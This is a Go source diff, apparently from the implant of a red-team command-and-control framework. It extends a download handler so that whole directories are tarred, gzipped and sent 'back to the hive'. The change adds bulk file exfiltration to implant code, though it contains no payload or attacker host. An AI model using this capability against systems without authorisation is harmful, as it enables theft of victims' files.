@@ -19,6 +19,7 @@ package handlers
 */
 
 import (
+	"archive/tar"
 	"bytes"
 	"compress/gzip"
 	"errors"
@@ -245,6 +246,7 @@ func pwdHandler(data []byte, resp RPCResponse) {
 
 // Send a file back to the hive
 func downloadHandler(data []byte, resp RPCResponse) {
+	var rawData []byte
 	downloadReq := &pb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
 	if err != nil {
@@ -255,7 +257,21 @@ func downloadHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	target, _ := filepath.Abs(downloadReq.Path)
-	rawData, err := ioutil.ReadFile(target)
+	fi, err := os.Stat(target)
+	if err != nil {
+		//{{if .Debug}}
+		log.Printf("stat failed on %s: %v", target, err)
+		//{{end}}
+		resp([]byte{}, err)
+		return
+	}
+	if fi.IsDir() {
+		var dirData bytes.Buffer
+		err = compressDir(target, &dirData)
+		rawData = dirData.Bytes()
+	} else {
+		rawData, err = ioutil.ReadFile(target)
+	}
 
 	var download *pb.Download
 	if err == nil {
@@ -410,4 +426,37 @@ func gzipRead(data []byte) ([]byte, error) {
 		return nil, err
 	}
 	return buf.Bytes(), nil
+}
+
+func compressDir(path string, buf io.Writer) error {
+	zipWriter := gzip.NewWriter(buf)
+	tarWriter := tar.NewWriter(zipWriter)
+
+	filepath.Walk(path, func(file string, fi os.FileInfo, err error) error {
+		header, err := tar.FileInfoHeader(fi, file)
+		if err != nil {
+			return err
+		}
+		header.Name = filepath.ToSlash(file)
+		if err := tarWriter.WriteHeader(header); err != nil {
+			return err
+		}
+		if !fi.IsDir() {
+			data, err := os.Open(file)
+			if err != nil {
+				return err
+			}
+			if _, err := io.Copy(tarWriter, data); err != nil {
+				return err
+			}
+		}
+		return nil
+	})
+	if err := tarWriter.Close(); err != nil {
+		return err
+	}
+	if err := zipWriter.Close(); err != nil {
+		return err
+	}
+	return nil
 }
